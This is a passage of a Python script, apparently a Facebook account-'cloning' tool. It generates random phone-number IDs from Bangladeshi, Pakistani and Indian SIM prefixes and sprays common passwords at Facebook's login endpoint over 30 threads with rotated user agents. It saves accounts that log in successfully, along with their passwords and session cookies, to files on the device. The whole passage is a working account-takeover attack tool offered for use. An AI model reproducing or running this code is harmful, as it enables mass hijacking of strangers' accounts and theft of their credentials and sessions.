        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m3') 
        print('\033[1;97m====================================================') 
        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        print('\033[1;97m====================================================') 
        for love in user:
            uid = code+love
            pwx = [love,'khankhan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def pass4():
    os.system("clear")
    print(logo)
    clear()
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
    print('\033[1;97m====================================================') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;97m====================================================') 
        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m4') 
        print('\033[1;97m====================================================') 
        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        print('\033[1;97m====================================================') 
        for love in user:
            uid = code+love
            pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def pass5():
    os.system("clear")
    print(logo)
    clear()
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
    print('\033[1;97m====================================================') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;97m====================================================') 
        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m5') 
        print('\033[1;97m====================================================') 
        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        print('\033[1;97m====================================================') 
        for love in user:
            uid = code+love
            pwx = ['khankhan','ali786','ali123','ali1122','aliali']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def pass6():
    os.system("clear")
    print(logo)
    clear()
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
    print('\033[1;97m====================================================') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;97m====================================================') 
    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;97m====================================================') 
        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m6') 
        print('\033[1;97m====================================================') 
        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        print('\033[1;97m====================================================') 
        for love in user:
            uid = code+love
            pwx = ['khankhan','malikmalik','malik123','malik12','malik786']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def freeq(uid,pwx,tl):
    global loop
    global ok
    global cp
    global ugen
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "next":"https://web.facebook.com/login/device-based/regular/login/?refsrc",
            "flow":"login_no_pain",
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'www.facebook.com',
            'method': 'GET',
            'path':'https://www.facebook.com/?_rdc=1&_rdr',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'referer':'https://www.facebook.com/',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mSUCCESSFUL\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                cek_apk(session,coki)
                open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mCHECKPOINT\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                    open('/sdcard/CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[CRACKING] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    main()
